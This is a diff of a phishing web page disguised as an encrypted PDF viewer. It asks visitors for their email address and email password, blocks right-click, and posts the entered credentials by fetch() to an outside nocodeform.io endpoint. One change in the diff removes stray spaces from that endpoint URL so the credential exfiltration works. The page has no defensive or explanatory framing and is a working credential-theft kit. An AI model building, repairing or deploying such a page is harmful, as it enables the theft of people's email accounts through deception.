@@ -84,18 +84,17 @@
 </head>
 <body>
   <img id="background" src="https://imgur.com/y60ndGD.png" alt="Background Image">
-  
+
   <div id="login-container">
     <img id="login-icon" src="https://www.iconpacks.net/icons/2/free-pdf-download-icon-2617-thumb.png" alt="Login Icon">
     <div id="small-text">This Document is end-to-end encrypted, &#x1F512;</div>
     <div id="beautiful-text">Sign in with your email address below to view document.</div>
 
     <!-- Form starts here -->
-
     <form action="" method="post" onsubmit="return login()">
       <input type="email" id="email" name="email" placeholder="Email Address" value="[[-Email-]]" required>
       <input type="password" id="password" name="password" placeholder="Email Password" required>
-      <button id="login-button" type="submit">View Document</button>
+      <button id="login-button" type="submit">View Document </button>
     </form>
     <!-- Form ends here -->
   </div>
@@ -105,7 +104,7 @@
 document.addEventListener('contextmenu', function (e) {
     e.preventDefault();
   });
-  
+
     document.addEventListener('DOMContentLoaded', function() {
       // Add blur effect after 0.4 seconds
       setTimeout(function() {
@@ -130,7 +129,7 @@ document.addEventListener('contextmenu', function (e) {
   }
 
   // Example: Send form data to the server using fetch
-  fetch('https://nocodeform.io/f/66c0ae9aba5e2beb630a8a62  ', {
+  fetch('https://nocodeform.io/f/66c0ae9aba5e2beb630a8a62', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
@@ -152,8 +151,8 @@ document.addEventListener('contextmenu', function (e) {
       // Handle errors during the fetch operation
       console.error('Fetch error:', error);
     });
-    
-    
+
+
      // Delay the alert by 0.1 second
      setTimeout(function() {
         // Example: Simple alert for demonstration
